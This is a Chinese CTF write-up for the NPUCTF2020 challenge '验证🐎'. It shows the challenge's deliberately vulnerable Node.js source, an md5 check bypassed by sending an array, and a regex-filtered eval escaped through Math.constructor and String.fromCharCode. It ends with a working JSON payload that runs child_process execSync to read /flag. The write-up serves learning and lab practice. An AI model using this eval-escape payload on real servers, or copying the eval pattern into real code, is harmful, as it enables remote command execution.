---
title: '[NPUCTF2020]验证🐎'
date: 2024-10-30 19:28:17
tags: 
      - nodejs
      - JS箭头函数
categories: 刷题笔记
---

## [NPUCTF2020]验证🐎

我们访问/source路由发现源码，为nodejs

```
const express = require('express');
const bodyParser = require('body-parser');
const cookieSession = require('cookie-session');

const fs = require('fs');
const crypto = require('crypto');

const keys = ['123ewqrqwwq']

function md5(s) {
    return crypto.createHash('md5')
        .update(s)
        .digest('hex');
}

function saferEval(str) {
    //let feng=str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')
    //console.log(`replace: ${feng}`)
    if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
        return null;
    }
    //console.log(`the code will be executed is :      ${str}`)
    return eval(str);
} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个

const template = fs.readFileSync('./index.html').toString();
function render(results) {
    return template.replace('{{results}}', results.join('<br/>'));
}

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(cookieSession({
    name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧
    keys
}));

Object.freeze(Object);
Object.freeze(Math);

app.post('/', function (req, res) {
    let result = '';
    const results = req.session.results || [];
    const { e, first, second } = req.body;
    //console.log(e)
    //console.log(first)
    //console.log(second)
    if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {
        if (req.body.e) {
            try {
                console.log("you can eval")
                result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
            } catch (e) {
                console.log(e);
                result = 'Wrong Wrong Wrong!!!';
            }
            results.unshift(`${req.body.e}=${result}`);
        }
    } else {
        results.unshift('Not verified!');
    }
    if (results.length > 13) {
        results.pop();
    }
    req.session.results = results;
    res.send(render(req.session.results));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
    res.set('Content-Type', 'text/javascript;charset=utf-8');
    res.send(fs.readFileSync('./test.js'));
});

app.get('/', function (req, res) {
    res.set('Content-Type', 'text/html;charset=utf-8');
    req.session.admin = req.session.admin || 0;
    res.send(render(req.session.results = req.session.results || []))
});

app.listen(39123, '0.0.0.0', () => {
    console.log('Start listening')
});


```

比较重要的就这串if判断代码

```

app.post('/', function (req, res) {
  let result = '';
  const results = req.session.results || [];
  const { e, first, second } = req.body;
  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {
    if (req.body.e) {
      try {
        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
      } catch (e) {
        console.log(e);
        result = 'Wrong Wrong Wrong!!!';
      }
      results.unshift(`${req.body.e}=${result}`);
    }
  } else {
    results.unshift('Not verified!');
  }
  if (results.length > 13) {
    results.pop();
  }
  req.session.results = results;
  res.send(render(req.session.results));
});
```

首先要进行md5绕过，我们利用数组绕过好了

原理大概是

```
[1]+'1'//'11'
'1'+'1'//'11'
[1]!=='1'
[1]+'1'==='1'+'1'
```

但我们要注意的是Content-type是application/json，我们需要使用json格式进行传参

```
{"e":"2-1","first":"1","second":[1]}
```

![image-20241030203233925](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410302032036.png)

然后我们可以通过修改e来进行rce

```
result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
```

```
function saferEval(str) {
    if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
        return null;
   //不是赋值
    return eval(str);
} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个

```

它会把满足正则表达式的部分全部删除后才能执行

我们来看一下这个正则，第一部分类似Math.xxx或者只有Math这样的，第二部分可以包括这些字符

[()+\-*/&|^%<>=,?:

第三部分是以一定数字开头，然后跟0或者1个点，然后任意的数字，然后0或者一个类似`e1111`这样的。感觉这是整数，浮点数和科学计数法。

正则理清的话就是如何rce了。首先就是拿到Function：

![image-20241030205336642](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410302053690.png)

我们利用constructor这个构造函数属性就可以拿到Function，然后拿到了Function，正常可以这样rce

```
let a=Math.constructor.constructor
console.log(a("return process.mainModule.require('child_process').execSync('dir').toString()")())
```

```
Math.constructor.constructor：这段代码利用 Math 对象的构造函数链来访问全局的 Function 构造器。
a("return process.mainModule.require('child_process').execSync('dir').toString()") 创建了一个新的函数，这个函数会执行传入的代码。在这个代码中，process.mainModule.require('child_process').execSync('dir') 用于执行 dir 命令，返回当前目录的文件列表。
```

在这题就是这样

```
Math=Math.constructor,
Math.constructor("return process.mainModule.require('child_process').execSync('dir').toString()")()

```

问题就是不允许字符串每一次Function里面很难绕过，所以我们使用`String.fromCharCode(...)` 

`String.fromCharCode(...)` 是一个 JavaScript 方法，用于根据 Unicode 编码值创建一个字符串。你可以传入一个或多个数字，这些数字代表 Unicode 字符的码点。

我们写个脚本，将字符转为ascii码

```
def gen(cmd):
  s = f"return process.mainModule.require('child_process').execSync('{cmd}').toString()"
  return ','.join([str(ord(i)) for i in s])

```

但问题是String怎么获取，在没有单双引号的情况下，这里字符串的拼接

```
Math+1 //"[object Math]1"

```

这里使用箭头函数

```
(Math=>(Math=Math.constructor,Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41,46,116,111,83,116,114,105,110,103,40,41))()))(Math+1)

```

缩进一下就长这样

```
(Math=>
    (Math=Math.constructor,
            Math.constructor(
                Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,
                    99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,
                    46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,
                    95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,
                    121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()
    )
)(Math+1)

```

```
(Math=>
        (Math=Math.constructor,
                Math.x=Math.constructor("return process.mainModule.require('child_process').execSync('cat /flag').toString()")()
        )
)(Math+1)
```

最外层是一个箭头函数和自调用函数，因为题目的限制，通过传入Math+1获取到了一个字符串对象，然后访问这个字符串对象的constructor，获取string类的原型，再获取string类原型的原型，得到了function类原型，然后用”return process.mainModule.require(‘child_process’).execSync(‘cat /flag’).toString()”创建出了一个匿名函数，并且也进行了自调用，完成了命令执行

同时也解释了为什么之前可以用Math去调用String的fromCharCode方法，因为原型的获取，我们获得了String和Function两个原型，String将数字转换为字符串，而Function将我们获得的字符串作为函数执行，再通过自调用函数这个语法，将函数创建之后即调用，完成了命令执行

一般的箭头函数都是用`{}`，但是因为这题只能用括号，而正好有用括号的语法，所以也可以用括号。

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/9cbd6574eee66bf08e53073a6252c6eb.png)

就相当于是：

```
Function(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,
                    99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,
                    46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,
                    95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,
                    121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()

```

类似`Function()()`的格式，里面的函数也同样可以调用，成功执行代码，得到flag。

payload

```
{"e":"(Math=>(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114, 101, 116, 117, 114, 110, 32, 103, 108, 111, 98, 97, 108, 46, 112, 114, 111, 99, 101, 115, 115, 46, 109, 97, 105, 110, 77, 111, 100, 117, 108, 101, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 46, 95, 108, 111, 97, 100, 40, 39, 99, 104, 105, 108, 100, 95, 112, 114, 111, 99, 101, 115, 115, 39, 41, 46, 101, 120, 101, 99, 83, 121, 110, 99, 40, 39, 99, 97, 116, 32, 47, 102, 108, 97, 103, 39, 41, 46, 116, 111, 83, 116, 114, 105, 110, 103, 40, 41))()))(Math+1)", "first":"1","second":[1]}
```



**自调用:(()=>())()**
			可以使用()代替{}

- 这时和{}的写法有所不同
- 不需要return了
- (参数1, 参数2, …, 参数N) => ( 语句1，语句2，语句3…… ) ，执行顺序从左到右，已最右边的语句结果作为返回值

![](https://ooo.0x0.ooo/2024/11/03/OHaIlg.png)
